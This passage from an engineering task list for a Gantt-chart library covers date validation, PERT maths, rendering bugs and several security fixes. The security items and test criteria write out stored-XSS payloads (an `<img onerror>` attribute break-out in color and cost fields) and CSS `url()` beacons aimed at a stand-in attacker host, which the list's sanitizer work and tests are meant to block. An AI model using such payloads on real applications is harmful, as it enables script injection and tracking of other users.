  - Malformed plans validate and then mis-render. For example, `meta.start: "Q4"` silently becomes 2026-01-01.
- **Fix:**
  - Add `isStrictISODate(value)`: the whole raw string must be `YYYY-MM-DD`, optionally followed by a well-formed time and zone (`ISO_TIME_SUFFIX_REGEX`). There is no trim or split, and the date must be a real one.
    - Use it for task and baseline dates and for `meta.start/end/chartStart/chartEnd/targetDate`.
  - Use `Number.isFinite` for `progress`, `gapDays` and `minGapDays`, with `gapDays ≥ 0` because leads belong in a link lag.
  - Add checks for:
    - the shape of `categories[*]` (`label`, `color` strings)
    - `people[*]`/`teams[*]` (`id`, `name`)
    - the `documents[*].status` enum
    - `milestone`/`locked` booleans
    - calendars (CORESCHED-14)
    - `dependsOn` (CORESCHED-12)
  - Severity rule:
    - Anything the engine cannot schedule or render is an **error**.
    - Optional fields it tolerates are **warnings**, collected in the new `ValidationResult.warnings?`. `valid` depends on errors only, so existing plans keep loading.
  - Do not add a runtime `ajv`: it adds bundle weight, and the schema test in CORESCHED-22 covers structure.
- **Verify:** `validator.test.ts`, one case each:
  - `"2026-01-01T99:99garbage"`, `" 2026-01-01"` and `meta.start: "Q4"` give `INVALID_DATE_FORMAT`.
  - `progress: NaN` gives `INVALID_PROGRESS`.
  - A category without a color and a person without a name give a `SCHEMA_MISMATCH` warning.
  - `"2026-01-01T09:00:00Z"` passes.

#### [ ] CORESCHED-23 · The PERT on-time probability ignores the PERT mean, reports a made-up 95% when there is no target, and leaves gaps out of the expected duration  `medium` `false-logic` `effort M`
- **Where:** `packages/core/src/pert.ts:131`, `packages/core/src/pert.ts:133`, `packages/core/src/pert.ts:104`
- **Problem:**
  - With no `targetDate` the result is a constant 0.95.
  - z is computed as (target − deterministic CPM finish) / σ, so the PERT mean is never used. A 10-day task with O = 10, M = 20, P = 30 and the target equal to its end has an expected duration of 20 days, but reports 0.5 instead of about 0.1%.
  - `expectedProjectDurationDays` sums task durations only: a 3-task chain spanning 34 days reports 31.5.
- **Fix:**
  - Candidate paths are `criticalResult.criticalPaths`, or the critical set ordered by ES when none are listed. Pick the path with the highest variance.
  - Sum unrounded `pertStatistics` values and round only the reported fields.
  - Expected finish = the path's planned finish (the CPM EF of its last task) + Σ(E_i − D_i), where D_i is the inclusive planned duration (CORESCHED-08). Gaps and lags are then included automatically.
  - Compute `z = (target − expectedFinish) / σ`. When σ = 0, the probability is 1 if expectedFinish ≤ target, otherwise 0.
  - With no valid target, `onTimeProbability` stays a `number`, so the type is unchanged for pgviews. It is measured against the planned project finish, and `confidencePercentages.targetDate` is left undefined. Hand-off to pgviews: label it "chance to finish on plan".
  - An invalid target is ignored, consistent with CORESCHED-24.
- **Verify:** new `packages/core/tests/pert.test.ts`:
  - The repro task (inclusive D = 10, E = 20, σ = 3.33, target = its end) gives `onTimeProbability ≈ 0.001`.
  - A 3-task chain spanning 34 days with E = D reports 34.
  - With no target and E = D, the probability is ≈ 0.5.

#### [ ] CORESCHED-25 · parseISODate silently turns invalid dates into real ones, using a hard-coded year of 2026  `medium` `error-handling` `effort M`
- **Where:** `packages/core/src/date-math.ts:53`

#### [ ] CORESCHED-36 · Four separate cycle detectors and two cascade entry points make the same edit behave differently depending on the UI path  `medium` `architecture` `effort L`
- **Where:** `packages/core/src/resolver.ts:11`, `packages/core/src/pipeline/stages/cycle-guard-stage.ts:13`, `packages/core/src/validator.ts:224`, `packages/core/src/cpm.ts:84`
- **Problem:**
  - Cycle detection exists four times with different semantics: resolver Kahn, a copy of it in CycleGuardStage, a recursive DFS in the validator, and Kahn again in the CPM.
  - `resolveSchedule` (used by gestures, the controller, engine load, the worker and mcp) skips sanitize and the cycle guard, while `SchedulePipeline` (used by the coordinator) runs both.
  - So a fix lands in one path but not the others, and a drag behaves differently from a modal edit.
- **Fix:**
  - One builder, `buildDependencyGraph(tasks)` in `dependencies.ts`, makes a single O(V+E) pass with an iterative Tarjan SCC (no recursion, so a 20k chain is safe). It returns:
    - `nodes` (Map, first occurrence wins)
    - typed `predecessors`, parsed once with `knownIds`
    - `order` (topological over the condensation)
    - `cycles`
    - `selfReferences`
    - `duplicateIds`
    - `isCyclicEdge`
  - The cascade, CPM, CycleGuardStage, validator and `hasDependencyCycle` all use it. Delete the other three detectors.
  - Decision D2: `resolveSchedule` stays cascade-only, because `SanitizeStage` rewrites `dependsOn` and must not run on every pointermove. Both entry points now produce identical dates because the cascade handles cycles, duplicates and dangling ids itself. The property test enforces this.
- **Verify:**
  - `rg -n "inDegree|queue\.shift\(|recStack" packages/core/src` finds nothing.
  - The property test (exit criterion 3) asserts that `resolveSchedule` and `createDefault().execute` give equal dates.

#### [ ] CORESCHED-28 · With a later target date, near-critical tasks are never flagged and critical tasks are labelled as buffer  `low` `backend-logic` `effort S`
- **Where:** `packages/core/src/cpm.ts:253`, `packages/core/src/cpm.ts:261`
- **Problem:** a task is critical when `tf === minTotalFloat`, but near-critical is measured from 0 (`tf − Math.min(0, minTotalFloat)`). With target 01-20, critical A (tf 15) is labelled "15d buffer", B (tf 17) is not near-critical, and EvmKpiCards shows "0 near-critical". The KPI cards and labels contradict the highlighting.
- **Fix:**
  - Set `criticalFloatRef = max(minTotalFloat, 0)`.
  - Critical = `tf ≤ 0 || tf === minTotalFloat`.
  - Near-critical = `!critical && tf − criticalFloatRef ≤ nearCriticalThresholdDays`.
  - `slackLabel` is `"Overdue by Nd"` when tf < 0, `"0d (Critical)"` when tf = 0, `"Critical · Nd to deadline"` for a positive critical float, and otherwise `"Nd buffer"`.
- **Verify:** `resolver.test.ts`, with a target later than the early finish: A is critical with label "Critical · 15d to deadline" and B is near-critical. Hand-off check for pgviews: EvmKpiCards counts `nearCriticalTaskIds`.

#### [ ] CORESCHED-29 · PERT and Monte Carlo read different field names and default spreads, and a PERT comment gives the wrong factors  `low` `inconsistency` `effort S`
- **Where:** `packages/core/src/pert.ts:111`, `packages/core/src/pert.ts:58`, `packages/core/src/monte-carlo.ts:173`
- **Problem:**
  - The comment says O = 0.8 / P = 1.4 × duration, but the code uses 0.85 and 1.35.
  - `pert.ts` reads `fields.*Duration`, while Monte Carlo reads `task.pert`, `fields.pert` or `fields.optimistic`, with spreads of 0.2 and 0.35.
  - Variance is rounded per task, so a 1-day task has variance 0.
  - The two risk engines give different answers for the same plan.
- **Fix:**
  - Export `getTaskThreePointEstimate(task): ThreePointEstimate` from `pert.ts`. It accepts, most specific first:
    1. `task.pert` / `fields.pert`
    2. `fields.optimisticDuration` / `mostLikelyDuration` / `pessimisticDuration`
    3. `optimistic` / `mostLikely` / `pessimistic` on the task or in `fields`
  - Defaults come from the exported `DEFAULT_PERT_OPTIMISTIC_FACTOR = 0.8` and `DEFAULT_PERT_PESSIMISTIC_FACTOR = 1.35`, which match Monte Carlo's 0.2/0.35 spreads. The result is ordered so that 0 ≤ O ≤ M ≤ P.
  - `estimateTaskPert` rounds only its outputs. The comment states the constants.
  - Hand-off to coreanalytics: `monte-carlo.ts:173` calls the helper.
- **Verify:** `pert.test.ts`, table-driven over all field spellings: missing values use 0.8/1.35, and O/M/P are re-ordered when given out of order. coreanalytics' `monte-carlo.test.ts` asserts the same O/M/P for the same task.

#### [ ] CORESCHED-30 · The DEP_TIMING_CONFLICT error code is never emitted, so locked tasks that violate their dependencies pass silently  `low` `false-logic` `effort S`
- **Where:** `packages/core/src/types.ts:218`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:56`
- **Problem:** the code is declared but never emitted. The cascade skips locked tasks even when a predecessor now finishes after them, and the validator never checks start dates against links, including when auto-cascade is off. Plans that break their own links report as valid, and the UI cannot flag the link.
- **Fix:**
  - The cascade pushes a diagnostic for each locked task whose required start is later than its own, naming the date and the code.
  - `validate()` emits a `DEP_TIMING_CONFLICT` **warning** for each link violated per `relationEarliestStartDay` (calendar-aware per CORESCHED-13):
    - for locked tasks always
    - for every task when `meta.autoCascade === false`
  - Each warning carries `taskId` and the predecessor id in its message.
  - Hand-off to corerender: style the flagged link.
- **Verify:**
  - `validator.test.ts`: a locked B starting before A's end gives one warning while `valid` stays true. A Strict-mode plan flags an unlocked task. An auto-cascade plan with an unlocked task gives no warning.
  - `resolver.test.ts`: a locked B is not moved and one diagnostic is emitted.

#### [ ] CORESCHED-31 · clampDayWidth returns NaN for NaN or undefined input, which puts NaN into the whole layout  `low` `bug` `effort S`
- **Where:** `packages/core/src/utils.ts:40`, `packages/core/src/layout.ts:89`
- **Problem:** `Math.max(MIN, Math.min(MAX, NaN))` is NaN, so `layout(data, {dayWidth: NaN})` returns NaN for canvasWidth, x and width. The engine stores the result. A bad persisted or URL zoom blanks the chart.
- **Fix:** `clampDayWidth(width, fallback = SCALE_DAY_WIDTHS.day)` substitutes `fallback` (or the day width if `fallback` is not finite) for non-finite input before clamping. The signature stays backward compatible.
- **Verify:** `utils.test.ts`: NaN, undefined and Infinity map to the clamped day width, and a custom fallback is honored. The layout check belongs to corerender's `layout.test.ts`.

#### [ ] CORESCHED-32 · syncTaskProgressAndStatus can produce contradictory status and progress values  `low` `bug` `effort S`
- **Where:** `packages/core/src/utils.ts:108`, `packages/core/src/utils.ts:110`
- **Problem:** `in-progress` together with progress 1 or 0 keeps that progress, so `isTaskDone` disagrees with the status. `submitted` with progress 2 returns 2, which then fails `INVALID_PROGRESS`. A NaN progress produces NaN. Kanban, EVM and the Gantt then disagree about whether a task is done.
- **Fix:**
  - `normalizeProgress(v)`: a finite value is clamped to [0, 1] and rounded to 2 decimals. A non-finite value is undefined, and a NaN in the patch is dropped from the result.
  - `in-progress` with an explicit progress is clamped to [0.01, 0.99]. The in-tree draft only clamps the top: it still lets 0 through.
  - `submitted` is clamped to [0.75, 0.99].
  - `completed`/`done` give 1, and `not-started` gives 0.
- **Verify:** `utils.test.ts`, table-driven:
  - `in-progress` + 1 gives 0.99, and `in-progress` + 0 gives 0.01.
  - `submitted` + 2 gives 0.99.
  - NaN in the patch is removed and the status is unchanged.
  - Every output satisfies `isTaskDone(r) === (r.status ∈ {completed, done})`.

#### [ ] CORESCHED-37 · Quadratic or repeated work on hot paths: queue.shift() in Kahn loops, re-parsing relations every pass, and findIndex inside the validator  `low` `performance` `effort S`
- **Where:** `packages/core/src/cpm.ts:93`, `packages/core/src/resolver.ts:44`, `packages/core/src/pipeline/stages/cycle-guard-stage.ts:41`, `packages/core/src/pipeline/stages/cascade-resolve-stage.ts:68`
- **Problem:** the three Kahn loops use `queue.shift()`, which is O(V²) on wide plans, and the CPM runs every render while `hasDependencyCycle` runs on every link. The cascade re-parses relations with regexes and re-resolves the calendar on every pass. The validator calls `findIndex` per error.
- **Fix:**
  - Subsumed by CORESCHED-36: Tarjan uses typed-array stacks and no `shift()`, relations are parsed once per resolve inside `buildDependencyGraph`, the calendar is resolved once per task, and the validator uses `idToIndex`.
  - Any remaining queue in owned code uses a head index instead of `shift()`.
- **Verify:** `rg -n "\.shift\(\)" packages/core/src/{cpm,resolver,validator}.ts packages/core/src/pipeline` finds nothing. The `dependencies.test.ts` 20k-node build and the 10k reverse-chain resolve stay within budget (exit criterion 6).

  3. Owner ask #1, manual, in Chrome, Firefox and Safari across all 7 built-in themes, on a 60-task plan at day scale with critical path on:
     - Scroll both axes, drag a critical bar and a marquee up into the header. No bar, glow, link, chip or lasso paints over the day/month header or the label column.
     - The Chart Settings popover is fully visible at 1440×900, in a 420 px-tall chart, and at 375×812 (sheet).
  4. Security: a plan containing all of the payloads below renders and hovers with no injected nodes, no `url(` in any inline style, and no outbound request (DevTools Network). A `readOnly` instance cannot remove links.
     - `color: "red\"><img src=x onerror=alert(1)>"` on a category, person, team and task
     - `color: "url(https://example.invalid/x)"`
     - `estimatedCost: "<img src=x onerror=alert(1)>"`
     - `meta.start: "1000-01-01"`
  5. Performance (Chrome Performance panel, 4× CPU throttle, 1 000 tasks over 2 years at day scale):
     - Dragging a bar keeps scripting under 8 ms per frame and does not replace `.jantt-body-wrap`.
     - A trackpad pinch renders at most once per frame.
     - With critical path on and the chart idle for 5 s, there is no recurring paint.
     - The DOM node count stays under about 6 000 at 1080p once CORERENDER-12 stage 4 lands.

### Tasks (severity order)

#### [ ] CORERENDER-01 · Critical-path bars, links and the marquee are not isolated from the sticky timeline header (owner ask #1)  `high` `ux` `effort S`
- **Where:** `packages/core/src/theme.css:1134` (`.jantt-timeline-header` z 40), `:1368` (unused `.jantt-grid-container`), `:1529-1536` (`.jantt-dep-path.is-critical`, no-op `z-index:10`), `:1574-1578` and `:1643-1647` (`z-index:14/15 !important` plus infinite animations), `:1700-1705` (`.jantt-selection-box` z 50); `packages/core/src/rendering/jantt-engine.ts:433-436`
- **Problem:** gridContainer only gets an inline `position:relative`, and `.jantt-body-wrap` is not isolated. The sticky header (40), the label column (45) and every canvas layer therefore compete in one stacking context. The marquee (50) always paints over the header. Critical bars and milestones carry `!important` z-indices, 48 px glows and infinite box-shadow/filter animations, so their paint order around the sticky header depends on the browser's compositing. This is owner complaint #1, and it shows in every theme.
- **Fix:**
  - `jantt-engine.ts`: set `gridContainer.className = "jantt-grid-container"` and drop the inline `position`.
  - `theme.css`: one stacking model, documented in a comment above `.jantt-container` (bottom to top):
    - `.jantt-body-wrap { position:relative; z-index:0; isolation:isolate }`: the whole scroll body sits below the toolbar tier.
    - `.jantt-grid-container { position:relative; z-index:0; isolation:isolate }`: grid (2), today line (5), SVG (4), bars (6), milestones (7), critical (14/15), drag (30), link chip (40) and marquee (50) all stay local to the canvas.
    - `.jantt-timeline-header { z-index:40; isolation:isolate; will-change:transform }`: one promoted layer for the header only, never per cell. `.jantt-label-column` stays at 45 and `.jantt-label-header` at 50.
    - Delete every `!important` on `.is-critical` z-index, border and animation, and delete the no-op `z-index:10` on the SVG path.
  - `dependency-links.ts`: append non-critical links first and critical links last. SVG paints in DOM order, so critical wires sit on top without any z-index.
  - Audit the `.jantt-theme-*` overrides. None may re-raise canvas items, set `position`/`z-index` on header descendants, or add `filter`/`transform` to the header, so all 7 themes share the model.
- **Verify:**
  - `timeline-header.test.ts` "Renderer hardening": after `renderJantt`, bars, `svg.jantt-svg-overlay` and `.jantt-today-line` are descendants of `.jantt-grid-container`. `theme.css` (read as text) contains both isolation rules and no `z-index: <n> !important` in an `.is-critical` rule.
  - Manual: exit criterion 3, with DevTools Rendering set to "Layer borders" showing the header as its own layer above the body.

#### [ ] CORERENDER-02 · Settings popover is hidden behind the sticky timeline header and label column  `high` `ux` `effort S`
- **Where:** `packages/core/src/theme.css:101` (`.jantt-toolbar` z 30 plus `backdrop-filter`), `:576` (`.jantt-settings-popover` z 100), `:1137` (header z 40), `:938` (label column z 45)
- **Problem:** `.jantt-toolbar` (`position:relative`, z 30, `backdrop-filter`) forms its own stacking context, so the popover's z 100 only counts inside it. The popover hangs into the body area, where the header (40), label column (45) and label header (50) sit in the parent context and cover its top ~58 px, the Line Routing row (complaint #4).
- **Fix:**
  - With the body isolated at z 0 (CORERENDER-01), set `.jantt-toolbar { position:relative; z-index: var(--jantt-z-toolbar, 60) }`, the pgshell PGSHELL-08 contract.
  - Do not portal. The popover stays inside the themed root, so it inherits theme variables and needs no scroll or resize repositioning.
- **Verify:** Manual: open Chart Settings at every scale with the label grid expanded and the body scrolled. In all 7 themes the whole popover is visible above the header and the table. A CSS-text assertion checks that the toolbar z-index token is greater than the body-wrap's 0.

#### [ ] CORERENDER-04 · Stored XSS: category, person and team colors are put unescaped into innerHTML style attributes  `high` `security` `effort M`
- **Where:** `packages/core/src/renderers/tooltip.ts:59`, `:90`; `packages/core/src/renderers/grid-table.ts:64`, `:69`
- **Problem:**
  - `category.color` and `avatarColor` (`person.color`/`team.color`) are interpolated raw into `style="…"` inside `innerHTML`.
  - The validator never checks colors, and room or share data reaches `renderJantt` unvalidated.
  - A color such as `red"><img src=x onerror=…>` runs script in every viewer's origin, with access to the Firebase session. In the grid this needs no click; in the tooltip it fires on hover. Same as XSS-01/XSS-02.
- **Fix:**
  - Add one allow-list helper, `sanitizeCssColor(value: unknown, fallback: string): string`, exported from `layout.ts` for renderers and the sidebar. It accepts:
    - hex in 3, 4, 6 or 8 digits
    - `rgb|rgba|hsl|hsla|hwb|lab|lch|oklab|oklch(…)` whose body has no parentheses, quotes, `;` or `<`
    - `var(--token)`
    - a bare keyword
    - nothing longer than 100 chars, trimmed
    - Everything else returns `fallback`. This rejects `url()`, `image-set()` and any attribute break-out.
  - `layout()` resolves each category once through it (`{...raw, color: sanitizeCssColor(raw.color, DEFAULT_CATEGORY.color)}`), so every renderer receives clean category colors.
  - `grid-table.ts`: create the dot and avatar with `createElement` and set `el.style.backgroundColor = sanitizeCssColor(…)`. If the template is kept, wrap the sanitized value in `escapeHtml` too, as belt and braces.
  - `tooltip.ts`: sanitize `catColor` the same way, then tint it per CORERENDER-35.
  - Ask `coreanalytics` to drop the private `safeColor` in `team-resolver.ts` and import the shared helper. Ask `coresched` (CORESCHED-21) to make the validator reject non-conforming colors.
- **Verify:**
  - "Renderer hardening": render malicious category, person and team colors, then hover a bar. There are no `img` or `[onerror]` nodes, and no inline style contains `url(` or `"`.
  - `layout.test.ts` gets a `sanitizeCssColor` table:
    - Accepts `#3B8`, `#3b82f680`, `rgb(1 2 3 / 50%)`, `teal` and `var(--jantt-accent)`.
    - Rejects `url(x)`, `red;background:url(x)`, `"><img>`, `expression(alert(1))` and a non-string value.

#### [ ] CORERENDER-05 · Stored XSS in hover card via estimatedCost and invalid start/end dates  `high` `security` `effort S`
- **Where:** `packages/core/src/renderers/tooltip.ts:129`, `:76` (and `date-math.ts:188`, owned by coresched, where `formatHumanDate` returns invalid input unchanged)
- **Problem:** `$${task.estimatedCost.toLocaleString()}` returns a string value unchanged. `formatHumanDate` passes non-ISO input through verbatim. Both land raw in the hover card's `innerHTML`, so `"estimatedCost": "<img src=x onerror=…>"`, or a malformed `start` arriving from RTDB, runs script on hover.
- **Fix:**
  - In `tooltip.ts`, escape every interpolation with the shared `escapeHtml` from `utils` and delete any local duplicate. That covers title, id, category label, dates, assignee, priority, dependency text, buffer text and notes.
  - Add `formatCost(v)`: return `""` unless `typeof v === "number" && Number.isFinite(v)`, and format with one module-level `Intl.NumberFormat` instance. Omit the row when it is empty.
  - Title: `String(getTaskDisplayName(task) ?? "")`.
- **Verify:** "Renderer hardening", hover-card case:
  - A string `estimatedCost` adds no nodes and hides the cost row. `NaN` hides it too.
  - `start: "<b>x</b>"` renders as literal text.
  - A numeric cost renders formatted.

#### [ ] CORERENDER-07 · Read-only mode bypass: clicking a dependency line deletes it and fires onCommit  `high` `security` `effort S`
- **Where:** `packages/core/src/rendering/jantt-engine.ts:474`; `packages/core/src/renderers/dependency-links.ts:82`; `packages/core/src/theme.css:1487`
- **Problem:** `onLinkDelete` is always passed and never checks `readOnly`. The visible `.jantt-dep-path` has `pointer-events: stroke`. One click removes the link, reschedules downstream tasks and fires `onCommit`, so viewers in read-only rooms can change the schedule, and editors lose links to stray clicks with no confirmation (same as XSS-29).
- **Fix:**
  - Engine: pass `onLinkDelete: this.currentOptions.readOnly ? undefined : this.handleLinkDelete`. `handleLinkDelete` checks `readOnly` again as defense in depth, then calls `TaskScheduleCoordinator.removeDependency` (type-preserving, CORERENDER-09), renders, and fires the optional `onLinkDelete` and `onCommit` options.
  - `dependency-links.ts`: set `editable = typeof onLinkDelete === "function"`. When it is false, create no hit path and attach no listeners. In CSS, `.jantt-dep-path { pointer-events:none; cursor:default }`; interaction only goes through `.jantt-dep-hit` (CORERENDER-08).
  - Editable mode: a click opens an anchored "Remove link" button chip inside the canvas.
    - Escape or a press outside dismisses it, and so does the next render.
    - It flips below the click point when there is no room under the header.
    - Its `pointerdown` handler stops propagation, so no pan starts.
    - Only the chip commits the removal.
- **Verify:** "Renderer hardening":
  - With `readOnly`: no `.jantt-dep-hit`, and dispatching a click on a path does not call `onCommit`.
  - Editable: a click shows the chip, confirming calls `onCommit` once, and the other typed dependencies are untouched.

#### [ ] CORERENDER-09 · Deleting a task or link flattens typed dependencies (SS/FF/SF, lag) and mutates shared task objects  `high` `data-loss` `effort M`
- **Where:** `packages/core/src/rendering/task-schedule-coordinator.ts:61`, `:83`; `packages/core/src/controller.ts:504` (coreinteract)
- **Problem:**
  - `deleteTask` and `removeDependency` rebuild every task's `dependsOn` from `getTaskDependencies`, which returns ids only. `{id:'a',type:'SS',lagDays:2}` and `'a:FF-1d'` both become `'a'`, and tasks with no dependencies get `dependsOn = null`.
  - They also assign `t.dependsOn` in place on objects shared with the previous `currentData` and the host state.
  - Any single delete therefore rewrites unrelated dependency semantics, shifts dates on the next cascade, and corrupts host undo snapshots and synced data (ARCH-03).
- **Fix:**
  - Use coresched's `filterDependsOn(dependsOn, keep, knownIds)` (CORESCHED-07). It filters the raw items in their original string, object or array form, and returns the same reference when nothing matched.
  - Rewrite only tasks whose relations reference the removed id, as `{...t, dependsOn: next ?? null}`, and return every other task object unchanged so reference equality holds.
  - Return `{...data, tasks}` and never mutate the input.
  - If ARCH-04 settles on tombstones (`_deleted`/`deletedAt` or `meta.tombstones`), apply them here once. `coreinteract` then replaces the duplicate delete at `controller.ts:504` with a call to `TaskScheduleCoordinator.deleteTask`.
- **Verify:** `layout.test.ts` "TaskScheduleCoordinator (typed dependencies & immutability)", with inputs passed through `Object.freeze` (deep):
  - Deleting `b` keeps `{id:'a',type:'SS',lagDays:2}` and `'a:FF-1d'` on unrelated tasks verbatim.
  - Removing one link of a multi-dependency task keeps the others.
  - Unchanged tasks are `===` to their inputs.

#### [ ] CORERENDER-10 · Default 'fit' row mode hides tasks: vertical overflow hidden while row height is clamped; header/toolbar heights mis-estimated  `high` `bug` `effort M`
- **Where:** `packages/core/src/rendering/jantt-engine.ts:372`; `packages/core/src/rendering/viewport-coordinator.ts:93`, `:102`; `packages/core/src/layout.ts:336`, `:468`
- **Problem:** Fit mode sets `overflowY = "hidden"` but clamps rows to `MIN_ROW_HEIGHT` (26), so 30 tasks in a 550 px container need 780 px and the bottom rows cannot be reached. Several heights in the budget are wrong:
  - The year span is computed from task dates only, while layout pads the window with buffers and today. A Nov/Dec plan whose buffer crosses the new year gets a 78 px header budgeted as 58 px.
  - The toolbar is assumed to be 50 px, and toolbar wrapping is ignored.
  - `viewport.headerHeight` is ignored by layout.
- **Fix:**
  - Never hide vertical overflow. The body keeps `overflow:auto` in every mode. When `count × MIN_ROW_HEIGHT > availH`, rows clamp to the minimum and the body scrolls.
  - Extract `computeChartBounds(data, viewportOptions)` (start, end, `totalDays`, `spansMultipleYears`) and `resolveHeaderHeight(spansMultipleYears, minHeight)` from `layout.ts`. Use them in both `layout()` and `calculateRowHeight`, so the budget always matches the rendered header. `viewport.headerHeight` acts as a minimum.
  - Mount or update the toolbar before sizing and use `toolbar.offsetHeight`. Subtract the horizontal scrollbar (`offsetHeight - clientHeight` of the previous body, or 0) and the real add-row height `min(rowH, 38)`. Drop the magic `borderBuffer` and the 100 px floor.
  - `broadcastViewport` reports the effective row height.
- **Verify:**
  - `layout.test.ts` "Fit row height sizing" checks four cases:
    - Rows plus the add row fill the body exactly.
    - With too many rows, they clamp to the minimum and the body scrolls.
    - A Dec 18-31 range budgets the multi-year header.
    - `computeChartBounds` matches the `layout()` window.
  - Manual: 40 tasks in a 500 px host; the last task can be reached by scrolling.

#### [ ] CORERENDER-12 · Every change tears down and rebuilds the whole chart DOM; virtualization is advertised but not used  `high` `performance` `effort L`
- **Where:** `packages/core/src/rendering/jantt-engine.ts:363`, `:377`; `packages/core/src/renderers/toolbar.ts:108`; `packages/core/src/virtualizer.ts:3`; `packages/core/src/controller.ts:440` (`scheduleRender`, coreinteract)
- **Problem:**
  - `render()` removes `.jantt-body-wrap` and recreates the header (one cell per day, with listeners), one grid column per day, every row, bar, SVG path and listener.
  - It also recomputes critical path, filter and layout every time.
  - It runs on every drag frame, every slider `input`, every Ctrl+wheel event, every search keystroke, and every 60 s.
  - `virtualizer.ts` claims "100,000+ tasks at 60 FPS", but the DOM renderer never imports it. Medium plans jank and large plans freeze, with heavy GC (ARCH-40).
- **Fix (four stages, each shippable on its own; 1 and 2 are required for exit criterion 5):**
  1. **Coalesce and memoize (S):**
     - Slider `input`, Ctrl+wheel and header column-drag share one `scheduleFrameRender()` with a single rAF id, cancelled in `destroy`.
     - Search is debounced to about 150 ms when the plan has more than 300 tasks, and stays instant below that.
     - The 60 s tick only moves the today line (CORERENDER-14).
     - Memoize `calculateCriticalPath` and `filterDisplayTasks` on the `currentData.tasks` reference plus their inputs. This is only valid after CORERENDER-15 removes in-place mutation.
  2. **Drag fast path (M):** while a gesture is active, the engine patches only the dragged bars (`style.left`/`width`, or `transform`) and sets `d` on their incident links through the `depPathElements` map that `renderDependencyLinks` already returns. One full render follows on pointerup. This needs one coreinteract hook (`onGestureFrame(taskIds)` instead of `scheduleRender` while dragging). The paths are recomputed only for incident links, with `computeDependencyPath`.
  3. **Persistent layers (M):**
     - Mount body-wrap, timeline area, header, grid layer, SVG and bar layer once.
     - On render, rebuild the header and grid only when their signature changes (`startDate|totalDays|dayWidth|scale|selectedDate|today`).
     - Reconcile bars and rows keyed by task id: reuse elements and update style, classes and text.
     - Attach `wheel`, `pointerdown` and `contextmenu` once in `mount()`, delegated on the canvas.
  4. **Windowing (M):**
     - Render only visible rows, bars and labels with `computeVerticalVirtualWindow`, and only visible day cells and grid columns with `computeHorizontalVirtualWindow`, using overscan and spacer padding.
     - Re-window from a passive `scroll` listener through rAF.
     - Draw only links whose bounding box intersects the window (`PlanVirtualizer.isVisible`, fixed in CORERENDER-30).
     - Skip windowing below 200 rows so small plans render exactly as before.
  - Until stage 4 ships, change the `virtualizer.ts` docstring so it no longer claims DOM-renderer support. No VDOM or framework dependency.
- **Verify:**
  - Manual: exit criterion 5, plus a MutationObserver on the root that counts zero `childList` changes on `.jantt-container` during a drag.
  - Engine test: `.jantt-body-wrap` keeps its identity across `instance.update()` (stage 3). With 2 000 tasks in a host whose `clientHeight` is mocked to 600, `querySelectorAll('.jantt-task-bar').length` is under 60 (stage 4).
  - Engine test: 10 `input` events in one frame produce one render (stage 1).

#### [ ] CORERENDER-03 · Settings popover flip and clipping logic is wrong (hard-coded 260px, flips into overflow:hidden, clipped on mobile)  `medium` `ux` `effort M`
- **Where:** `packages/core/src/renderers/toolbar.ts:315`; `packages/core/src/theme.css:76` (`.jantt-container{overflow:hidden}`), `:2531` (mobile `.jantt-toolbar{overflow-x:auto}`)
- **Problem:**
  - `togglePopover` assumes `popoverH = 260`, but the panel with the Data & Persistence section is much taller.
  - When space below is short, it flips to `bottom: calc(100% + 8px)`, above the toolbar, which is the first row of an `overflow:hidden` container. The panel is clipped away.
  - On phones, the toolbar's `overflow-x:auto` clips the absolutely positioned popover.
- **Fix:**
  - Delete the 260 constant and the upward flip, since there is never room above inside the container.
  - After opening, compute `available = min(rootRect.bottom, innerHeight) - triggerRect.bottom - 8` and set `max-height: max(200px, available)` with internal scroll.
  - Recompute on `resize` while the popover is open. Add one listener on open and remove it on close.
  - At `max-width: 768px`, render the popover as a bottom sheet: `position:fixed; inset:auto 0 0 0; max-height:80vh; border-radius:16px 16px 0 0`, plus a light backdrop.
  - Remove `backdrop-filter` from the mobile toolbar, because it would become the fixed sheet's containing block. Keep `overflow-x:auto` on the button strip only, never on an ancestor of the popover.
- **Verify:** Manual: in a 420 px-tall chart at 1440×900 and at 375×812, every popover row can be reached and the panel is never clipped. jsdom test with mocked rects: no `bottom` flip style, and a `max-height` is set.

#### [ ] CORERENDER-06 · CSS injection via task, category and avatar colors assigned with style.background (url() beacons)  `medium` `security` `effort S`
- **Where:** `packages/core/src/renderers/task-bars.ts:96`, `:136`, `:182`
- **Problem:** `bar.style.background = task.color || category.color`, the milestone fill and `aAvatar.style.background = avatarColor` accept any CSS background, including `url(https://attacker/x?room=…)`. Any collaborator can make every viewer's browser request attacker URLs, leaking IP and presence, or paint arbitrary images. A missing color gives `background: undefined`, which leaves the bar invisible (XSS-27).
- **Fix:**
  - `fill = sanitizeCssColor(task.color, category.color)`. The category is already sanitized by layout.
  - Avatars: `sanitizeCssColor(avatarColor, "rgba(0,0,0,.35)")`.
  - Assign through `style.backgroundColor`, which the CSSOM rejects for images even if the allow-list ever regressed.
- **Verify:** "Renderer hardening": a bar with `color: "url(https://example.invalid/x)"` has no `url(` in its inline style and uses the category color. A missing color also falls back to the category color.

#### [ ] CORERENDER-11 · Fit mode plus ResizeObserver feedback loop collapses rows in auto-height containers  `medium` `bug` `effort S`
- **Where:** `packages/core/src/rendering/jantt-engine.ts:535`; `packages/core/src/rendering/viewport-coordinator.ts:84`; `packages/core/src/theme.css:81`
- **Problem:** Row height comes from `container.clientHeight`. In a host with no explicit height, `.jantt-container{height:100%}` resolves to auto, so content height drives container height. Each render comes out about 6 px shorter (the `borderBuffer`, and a 38 px add-row budget against the real `min(rowH,38)`). The ResizeObserver (more than 2 px) then re-renders, and the loop shrinks rows step by step to 26 px.
- **Fix:**
  - With the exact budget from CORERENDER-10, a content-sized host is a fixed point: the rendered height equals the measured height.
  - At the end of `render()`, store the observed size as `lastObservedWidth/Height`, so the observer ignores size changes caused by our own render.
  - If the container has no definite height (`clientHeight === 0`) or no space yet, fall back to `customRowHeight` instead of 550 px guesses.
- **Verify:**
  - `layout.test.ts`: "is a fixed point for content-sized hosts" and "falls back to the custom row height when the chart has no definite space yet".
  - Engine test with an auto-height host: three observer callbacks leave the row height stable, with at most 2 renders.

#### [ ] CORERENDER-13 · Keyboard users lose focus after every arrow, Enter or lock action  `medium` `accessibility` `effort S`
- **Where:** `packages/core/src/rendering/jantt-engine.ts:364`; `packages/core/src/renderers/task-bars.ts:271`; `packages/core/src/renderers/grid-table.ts:80`
